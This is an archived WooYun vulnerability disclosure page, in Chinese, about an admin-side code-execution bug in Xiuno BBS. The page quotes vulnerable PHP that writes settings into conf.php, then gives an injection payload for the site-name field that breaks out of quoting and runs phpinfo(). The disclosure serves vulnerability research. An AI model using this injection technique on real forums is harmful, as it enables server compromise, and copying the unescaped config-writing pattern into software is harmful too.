@@ -1,0 +1,360 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		热个身，xiuno bbs后台代码执行漏洞  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		热个身，xiuno bbs后台代码执行漏洞  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/猪头子">猪头子</a> 
+</li><li>提交时间：		2013-03-08 10:50</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-03-08：	积极联系厂商并且等待厂商认领中，细节不对外公开<br/>
+									2013-04-22：	厂商已经主动忽略漏洞，细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">官方介绍：<br />
+Xiuno 这个名字来源于圣斗士星矢白羊座的黄金圣斗士修罗，他的攻击速度和战斗力是十二宫最强的，他是速度和力量的化身；在佛教里面，修罗为六道之一，处于人道和天道之间的一道，半人半神，性情刚烈，好战斗。我们取其寓意，希望XIUNO变得越来越强，越来越快。<br />
+在 Xiuno BBS 的第一行代码开始（一共大约有4W多行代码，历时多年积累）对性能的追求就到了苛刻，完美，歇斯底里，神经质，作者本人经常因为权衡一个方案而陷入冥想状态，在千万级数据下，最终的程序执行速度基本控制在0.00x秒，是作者本人比较满意的。<br />
+<br />
+漏洞描述：<br />
+xiuno后台在写入配置文件时出现漏洞，导致代码执行</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">	1. 系统配置并非存放在数据库中，而是存放在conf.php中;<br />
+<br />
+	2. 使用数组的方法存放;<br />
+<br />
+	3. 有转义: &#039; =&gt; \&#039; ;<br />
+<br />
+	4. &#039;\&#039;没有转义;<br />
+<br />
+	5. 插入\&#039;会被转义为\\&#039;，php中\\表示一个\，而单引号就逃脱了转义，因此可以闭合前面的数组;<br />
+<br />
+	6. 该漏洞在后台管理中多次出现，包括灯鹭插件的设置中也出现。<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+<br />
+在admin/control/conf_control.class.php的on_base方法中：<br />
+<br />
+</p><pre><code>public function on_base() {<br />
+		global $conf;<br />
+		$timezones = array(<br />
+			&#039;+0&#039; =&gt; &#039;+0 &#039;,<br />
+			&#039;+1&#039; =&gt; &#039;+1 &#039;,<br />
+			&#039;+2&#039; =&gt; &#039;+2 &#039;,<br />
+			&#039;+3&#039; =&gt; &#039;+3 &#039;,<br />
+			&#039;+4&#039; =&gt; &#039;+4 &#039;,<br />
+			&#039;+5&#039; =&gt; &#039;+5 &#039;,<br />
+			&#039;+6&#039; =&gt; &#039;+6 &#039;,<br />
+			&#039;+7&#039; =&gt; &#039;+7 &#039;,<br />
+			&#039;+8&#039; =&gt; &#039;+8 北京时间&#039;,<br />
+			&#039;+9&#039; =&gt; &#039;+9 &#039;,<br />
+			&#039;+10&#039; =&gt; &#039;+10 &#039;,<br />
+			&#039;+11&#039; =&gt; &#039;+11 &#039;,<br />
+			&#039;+12&#039; =&gt; &#039;+12 &#039;,<br />
+			&#039;+13&#039; =&gt; &#039;+13 &#039;,<br />
+			&#039;+14&#039; =&gt; &#039;+14 &#039;,<br />
+			&#039;+15&#039; =&gt; &#039;+15 &#039;,<br />
+			&#039;+16&#039; =&gt; &#039;+16 &#039;,<br />
+			&#039;+17&#039; =&gt; &#039;+17 &#039;,<br />
+			&#039;+18&#039; =&gt; &#039;+18 &#039;,<br />
+			&#039;+19&#039; =&gt; &#039;+19 &#039;,<br />
+			&#039;+20&#039; =&gt; &#039;+20 &#039;,<br />
+			&#039;+21&#039; =&gt; &#039;+21 &#039;,<br />
+			&#039;+22&#039; =&gt; &#039;+22 &#039;,<br />
+			&#039;+23&#039; =&gt; &#039;+23 &#039;,<br />
+		);<br />
+		<br />
+		$input = array();<br />
+		$bbs = include BBS_PATH.&#039;conf/conf.php&#039;;<br />
+		$error = $post = array();<br />
+<br />
+		//获取用户提交的设置信息<br />
+		if($this-&gt;form_submit()) {<br />
+			$post[&#039;app_name&#039;] = core::gpc(&#039;app_name&#039;, &#039;P&#039;);<br />
+			$post[&#039;urlrewrite&#039;] = intval(core::gpc(&#039;urlrewrite&#039;, &#039;P&#039;));<br />
+			$post[&#039;timeoffset&#039;] = core::gpc(&#039;timeoffset&#039;, &#039;P&#039;);<br />
+			$post[&#039;upload_url&#039;] = core::gpc(&#039;upload_url&#039;, &#039;P&#039;);<br />
+			$post[&#039;static_url&#039;] = core::gpc(&#039;static_url&#039;, &#039;P&#039;);<br />
+			$post[&#039;credits_policy_post&#039;] = intval(core::gpc(&#039;credits_policy_post&#039;, &#039;P&#039;));<br />
+			$post[&#039;credits_policy_reply&#039;] = intval(core::gpc(&#039;credits_policy_reply&#039;, &#039;P&#039;));<br />
+			$post[&#039;golds_policy_reply&#039;] = intval(core::gpc(&#039;golds_policy_reply&#039;, &#039;P&#039;));<br />
+			$post[&#039;credits_policy_thread&#039;] = intval(core::gpc(&#039;credits_policy_thread&#039;, &#039;P&#039;));<br />
+			$post[&#039;credits_policy_digest_1&#039;] = intval(core::gpc(&#039;credits_policy_digest_1&#039;, &#039;P&#039;));<br />
+			$post[&#039;credits_policy_digest_2&#039;] = intval(core::gpc(&#039;credits_policy_digest_2&#039;, &#039;P&#039;));<br />
+			$post[&#039;credits_policy_digest_3&#039;] = intval(core::gpc(&#039;credits_policy_digest_3&#039;, &#039;P&#039;));<br />
+			$post[&#039;golds_policy_post&#039;] = intval(core::gpc(&#039;golds_policy_post&#039;, &#039;P&#039;));<br />
+			$post[&#039;golds_policy_thread&#039;] = intval(core::gpc(&#039;golds_policy_thread&#039;, &#039;P&#039;));<br />
+			$post[&#039;golds_policy_digest_1&#039;] = intval(core::gpc(&#039;golds_policy_digest_1&#039;, &#039;P&#039;));<br />
+			$post[&#039;golds_policy_digest_2&#039;] = intval(core::gpc(&#039;golds_policy_digest_2&#039;, &#039;P&#039;));<br />
+			$post[&#039;golds_policy_digest_3&#039;] = intval(core::gpc(&#039;golds_policy_digest_3&#039;, &#039;P&#039;));<br />
+			$post[&#039;cache_pid&#039;] = intval(core::gpc(&#039;cache_pid&#039;, &#039;P&#039;));<br />
+			$post[&#039;cache_tid&#039;] = intval(core::gpc(&#039;cache_tid&#039;, &#039;P&#039;));<br />
+			$post[&#039;app_brief&#039;] = core::gpc(&#039;app_brief&#039;, &#039;P&#039;);<br />
+			$post[&#039;app_starttime&#039;] = core::gpc(&#039;app_starttime&#039;, &#039;P&#039;);<br />
+			$post[&#039;tmp_path&#039;] = core::gpc(&#039;tmp_path&#039;, &#039;P&#039;);<br />
+			$post[&#039;click_server&#039;] = core::gpc(&#039;click_server&#039;, &#039;P&#039;);<br />
+			$post[&#039;reg_on&#039;] = intval(core::gpc(&#039;reg_on&#039;, &#039;P&#039;));<br />
+			$post[&#039;reg_email_on&#039;] = intval(core::gpc(&#039;reg_email_on&#039;, &#039;P&#039;));<br />
+			$post[&#039;reg_init_golds&#039;] = intval(core::gpc(&#039;reg_init_golds&#039;, &#039;P&#039;));<br />
+			$post[&#039;resetpw_on&#039;] = intval(core::gpc(&#039;resetpw_on&#039;, &#039;P&#039;));<br />
+			$post[&#039;app_copyright&#039;] = core::gpc(&#039;app_copyright&#039;, &#039;P&#039;);<br />
+			$post[&#039;seo_title&#039;] = core::gpc(&#039;seo_title&#039;, &#039;P&#039;);<br />
+			$post[&#039;seo_keywords&#039;] = core::gpc(&#039;seo_keywords&#039;, &#039;P&#039;);<br />
+			$post[&#039;seo_description&#039;] = core::gpc(&#039;seo_description&#039;, &#039;P&#039;);<br />
+			$post[&#039;threadlist_hotviews&#039;] = intval(core::gpc(&#039;threadlist_hotviews&#039;, &#039;P&#039;));<br />
+			$post[&#039;search_type&#039;] = core::gpc(&#039;search_type&#039;, &#039;P&#039;);<br />
+			$post[&#039;sphinx_host&#039;] = core::gpc(&#039;sphinx_host&#039;, &#039;P&#039;);<br />
+			$post[&#039;sphinx_port&#039;] = core::gpc(&#039;sphinx_port&#039;, &#039;P&#039;);<br />
+			$post[&#039;sphinx_datasrc&#039;] = core::gpc(&#039;sphinx_datasrc&#039;, &#039;P&#039;);<br />
+			$post[&#039;sphinx_deltasrc&#039;] = core::gpc(&#039;sphinx_deltasrc&#039;, &#039;P&#039;);<br />
+			$post[&#039;china_icp&#039;] = core::gpc(&#039;china_icp&#039;, &#039;P&#039;);<br />
+			$post[&#039;footer_js&#039;] = core::gpc(&#039;footer_js&#039;, &#039;P&#039;);<br />
+			$post[&#039;site_pv&#039;] = intval(core::gpc(&#039;site_pv&#039;, &#039;P&#039;));<br />
+			$post[&#039;site_runlevel&#039;] = intval(core::gpc(&#039;site_runlevel&#039;, &#039;P&#039;));<br />
+			$post[&#039;forum_index_pagesize&#039;] = intval(core::gpc(&#039;forum_index_pagesize&#039;, &#039;P&#039;));<br />
+			<br />
+			// hook admin_conf_base_gpc_after.php<br />
+			<br />
+			// check 数据格式<br />
+			$error[&#039;app_name&#039;] = $this-&gt;check_app_name($post[&#039;app_name&#039;]);<br />
+			<br />
+			if(misc::values_empty($error)) {<br />
+				$error = array();<br />
+				if($post[&#039;urlrewrite&#039;] != $this-&gt;conf[&#039;urlrewrite&#039;]) {<br />
+					$this-&gt;clear_cache($this-&gt;conf[&#039;tmp_path&#039;], &#039;bbs_&#039;);<br />
+					$this-&gt;clear_cache($this-&gt;conf[&#039;tmp_path&#039;], &#039;bbsadmin_&#039;);<br />
+					if(!empty($post[&#039;urlrewrite&#039;]) &amp;&amp; $post[&#039;urlrewrite&#039;] != $bbs[&#039;urlrewrite&#039;]) {<br />
+						$testurl = $bbs[&#039;app_url&#039;].&#039;index.htm&#039;;<br />
+						try {<br />
+							$html = misc::get_url($testurl);<br />
+						} catch(Exception $e) {<br />
+							$html = &#039;&#039;;<br />
+						}<br />
+						if(strpos($html, &#039;&lt;html&#039;) === FALSE) {<br />
+							$post[&#039;urlrewrite&#039;] = 0;<br />
+						}<br />
+					}<br />
+				}<br />
+				<br />
+				//将配置写入到文件中<br />
+				$this-&gt;mconf-&gt;set_to(&#039;app_name&#039;, $post[&#039;app_name&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;urlrewrite&#039;, $post[&#039;urlrewrite&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;timeoffset&#039;, $post[&#039;timeoffset&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;upload_url&#039;, $post[&#039;upload_url&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;static_url&#039;, $post[&#039;static_url&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;click_server&#039;, $post[&#039;click_server&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;credits_policy_post&#039;, $post[&#039;credits_policy_post&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;credits_policy_reply&#039;, $post[&#039;credits_policy_reply&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;golds_policy_reply&#039;, $post[&#039;golds_policy_reply&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;credits_policy_thread&#039;, $post[&#039;credits_policy_thread&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;credits_policy_digest_1&#039;, $post[&#039;credits_policy_digest_1&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;credits_policy_digest_2&#039;, $post[&#039;credits_policy_digest_2&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;credits_policy_digest_3&#039;, $post[&#039;credits_policy_digest_3&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;golds_policy_post&#039;, $post[&#039;golds_policy_post&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;golds_policy_thread&#039;, $post[&#039;golds_policy_thread&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;golds_policy_digest_1&#039;, $post[&#039;golds_policy_digest_1&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;golds_policy_digest_2&#039;, $post[&#039;golds_policy_digest_2&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;golds_policy_digest_3&#039;, $post[&#039;golds_policy_digest_3&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;cache_pid&#039;, $post[&#039;cache_pid&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;cache_tid&#039;, $post[&#039;cache_tid&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;app_brief&#039;, $post[&#039;app_brief&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;app_starttime&#039;, $post[&#039;app_starttime&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;reg_on&#039;, $post[&#039;reg_on&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;reg_email_on&#039;, $post[&#039;reg_email_on&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;reg_init_golds&#039;, $post[&#039;reg_init_golds&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;resetpw_on&#039;, $post[&#039;resetpw_on&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;app_copyright&#039;, $post[&#039;app_copyright&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;seo_title&#039;, $post[&#039;seo_title&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;seo_keywords&#039;, $post[&#039;seo_keywords&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;seo_description&#039;, $post[&#039;seo_description&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;threadlist_hotviews&#039;, $post[&#039;threadlist_hotviews&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;search_type&#039;, $post[&#039;search_type&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;sphinx_host&#039;, $post[&#039;sphinx_host&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;sphinx_port&#039;, $post[&#039;sphinx_port&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;sphinx_datasrc&#039;, $post[&#039;sphinx_datasrc&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;sphinx_deltasrc&#039;, $post[&#039;sphinx_deltasrc&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;china_icp&#039;, $post[&#039;china_icp&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;footer_js&#039;, $post[&#039;footer_js&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;site_pv&#039;, $post[&#039;site_pv&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;site_runlevel&#039;, $post[&#039;site_runlevel&#039;]);<br />
+				$this-&gt;mconf-&gt;set_to(&#039;forum_index_pagesize&#039;, $post[&#039;forum_index_pagesize&#039;]);<br />
+				<br />
+				// hook admin_conf_base_set_after.php<br />
+				<br />
+				//$this-&gt;mconf-&gt;set_to(&#039;tmp_path&#039;, $post[&#039;tmp_path&#039;]);<br />
+				$this-&gt;mconf-&gt;save();<br />
+			}<br />
+			<br />
+			// 删除模板缓存<br />
+			$this-&gt;truncate_tpl_cache();<br />
+		}<br />
+		。。。<br />
+	}</code></pre><p class='detail'><br />
+<br />
+直接写入到了文件中，由于过滤不严，我们用\&#039;即可绕过单引号过滤，达到闭合单引号的目的。<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">设置 -&gt; 基本设置 -&gt; 站点名称 加上 \&#039;,)&amp;&amp;phpinfo();/* (其他地方应该也可以，没测试)<br />
+<br />
+</p><p class="detail"><a href="../images/08003604f4bfdb1ffcbb629c046c7a929e4bd801.png" target="_blank"><img src="../images/08003604f4bfdb1ffcbb629c046c7a929e4bd801.png" alt="Image.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+这样就在conf/conf.php中写入了如下代码：<br />
+<br />
+      return array (<br />
+<br />
+      <br />
+<br />
+       ......<br />
+<br />
+       // 唯一识别ID<br />
+<br />
+       &#039;app_id&#039; =&gt; &#039;bbs&#039; ,<br />
+<br />
+      <br />
+<br />
+       // 站点名称<br />
+<br />
+       &#039;app_name&#039; =&gt; &#039;Xiuno BBS \\&#039; ,)&amp;&amp;phpinfo();/*&#039;,<br />
+<br />
+     形成了return array() &amp;&amp; phpinfo();<br />
+<br />
+     通过使用&amp;&amp;达到执行命令的目地.<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/08003643cbb57567c31df5efff321cd5bb0766d2.png" target="_blank"><img src="../images/08003643cbb57567c31df5efff321cd5bb0766d2.png" alt="Image.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">如果要将配置放入到文件中的话，做好过滤措施 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/猪头子" title="猪头子">猪头子</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-019717" title="热个身，xiuno bbs后台代码执行漏洞">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+									<h3 class="detailTitle">厂商回应：</h3>
+										<p class="detail">未能联系到厂商或者厂商积极拒绝</p>
+																	
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="19717";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
